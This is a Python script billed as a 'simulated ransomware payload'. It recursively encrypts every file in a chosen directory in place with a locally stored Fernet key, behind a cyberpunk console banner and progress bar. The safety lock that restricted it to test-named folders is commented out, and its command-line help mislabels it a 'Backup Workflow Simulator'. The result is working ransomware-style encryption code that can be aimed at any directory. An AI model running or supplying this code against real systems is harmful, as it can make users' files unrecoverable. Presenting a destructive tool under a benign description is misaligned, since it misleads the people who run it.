import os
import sys
import argparse
import time
from cryptography.fernet import Fernet
from rich.console import Console
from rich.panel import Panel
from rich.progress import (
    Progress,
    SpinnerColumn,
    TextColumn,
    BarColumn,
    TaskProgressColumn,
)
from rich.prompt import Confirm
from rich.text import Text
from rich.align import Align

# Initialize the Rich Console
console = Console()

KEY_FILE = "pampum.key"


def print_banner():
    """Prints a cyberpunk/hacker style banner."""
    console.clear()
    banner = """
    ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
    ██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
    ██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
    ██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
    ██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝
             [ SIMULATED RANSOMWARE PAYLOAD v2.0 ]
    """
    panel = Panel(
        Align.center(Text(banner, style="bold red")),
        border_style="red",
        title="[ SYSTEM COMPROMISE SIMULATOR ]",
        subtitle="[ STRICTLY FOR AUTHORIZED TESTING ]",
    )
    console.print(panel)
    print("\n")


def load_or_generate_key():
    """Generates a new AES key or loads an existing one for decryption."""
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "rb") as file:
            return file.read()
    else:
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as file:
            file.write(key)
        console.print(
            f"[bold yellow][!][/] New cryptographic key generated: [underline]{KEY_FILE}[/]"
        )
        return key


def process_file(file_path, cipher_suite, mode):
    """Encrypts or decrypts a single file."""
    try:
        with open(file_path, "rb") as file:
            data = file.read()

        if mode == "encrypt":
            processed_data = cipher_suite.encrypt(data)
        elif mode == "decrypt":
            processed_data = cipher_suite.decrypt(data)

        with open(file_path, "wb") as file:
            file.write(processed_data)
        return True
    except Exception:
        return False


def count_files(target_dir):
    """Counts total files for the progress bar."""
    total = 0
    for root, _, files in os.walk(target_dir):
        total += len([f for f in files if f != KEY_FILE])
    return total


def run_simulation(target_dir, mode):
    print_banner()

    # --- SAFETY GUARDRAIL ---
    # safe_keywords = ["dummy", "sim", "test"]
    # folder_name = os.path.basename(os.path.normpath(target_dir)).lower()

    # if not any(keyword in folder_name for keyword in safe_keywords):
    #     console.print(
    #         Panel(
    #             f"[bold white]Target directory:[/]\n{target_dir}\n\n[bold white]Reason:[/]\nDirectory name does not contain 'dummy', 'sim', or 'test'.",
    #             title="[bold red]CRITICAL SAFETY LOCK ENGAGED[/]",
    #             border_style="red",
    #         )
    #     )
    #     sys.exit(1)
    # -------------------------

    if not os.path.exists(target_dir):
        console.print(f"[bold red][X][/] Target directory does not exist: {target_dir}")
        sys.exit(1)

    # Establish Aesthetic Colors based on Mode
    theme_color = "red" if mode == "encrypt" else "green"
    action_text = "ENCRYPT" if mode == "encrypt" else "DECRYPT"

    console.print(f"[{theme_color}]Target Acquired:[/] {target_dir}")

    # Cinematic confirmation prompt
    if not Confirm.ask(
        f"[bold {theme_color}]Are you sure you want to {action_text} these files?[/]"
    ):
        console.print("[bold yellow]Sequence aborted.[/]")
        sys.exit(0)

    # Cinematic key loading
    with console.status(
        f"[bold {theme_color}]Initializing cryptographic engine...",
        spinner="bouncingBar",
    ):
        time.sleep(1.5)  # Fake delay for cinematic effect
        key = load_or_generate_key()
        cipher_suite = Fernet(key)

    total_files = count_files(target_dir)

    if total_files == 0:
        console.print("[bold yellow][!][/] No files found to process.")
        sys.exit(0)

    console.print(
        f"\n[bold {theme_color}]Commencing {mode} operation on {total_files} files...[/]\n"
    )

    # The Hacker Progress Bar
    with Progress(
        SpinnerColumn(style=f"bold {theme_color}"),
        TextColumn(f"[bold {theme_color}]{{task.description}}"),
        BarColumn(complete_style=theme_color, finished_style="bold white"),
        TaskProgressColumn(),
        TextColumn("[cyan]{task.completed}/{task.total} files"),
    ) as progress:

        task = progress.add_task(f"Processing...", total=total_files)
        success_count = 0

        for root, _, files in os.walk(target_dir):
            for file in files:
                if file == KEY_FILE:
                    continue

                file_path = os.path.join(root, file)

                # Update progress bar description with current file (truncated to fit screen)
                short_name = (file[:20] + "..") if len(file) > 20 else file
                progress.update(task, description=f"[{action_text}] {short_name}")

                if process_file(file_path, cipher_suite, mode):
                    success_count += 1

                progress.advance(task)
                time.sleep(
                    0.01
                )  # Tiny delay so you can actually see the cool progress bar

    # Final Report
    console.print("\n")
    if success_count == total_files:
        console.print(
            Panel(
                f"Successfully processed {success_count}/{total_files} files.\nOperation: [bold {theme_color}]{mode.upper()}[/]",
                title="[bold green]MISSION ACCOMPLISHED[/]",
                border_style="green",
            )
        )
    else:
        console.print(
            Panel(
                f"Processed {success_count}/{total_files} files.\n[bold red]Some files failed due to permissions or locks.[/]",
                title="[bold yellow]OPERATION INCOMPLETE[/]",
                border_style="yellow",
            )
        )


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Backup Workflow Simulator")
    parser.add_argument(
        "-t", "--target", required=True, help="Path to target directory"
    )
    parser.add_argument(
        "-m",
        "--mode",
        required=True,
        choices=["encrypt", "decrypt"],
        help="Operation mode",
    )
    args = parser.parse_args()

    # Hide traceback on user keyboard interrupt (Ctrl+C) to keep the terminal clean
    try:
        run_simulation(args.target, args.mode)
    except KeyboardInterrupt:
        console.print("\n[bold red][!] Sequence forcefully terminated by user.[/]")
        sys.exit(1)
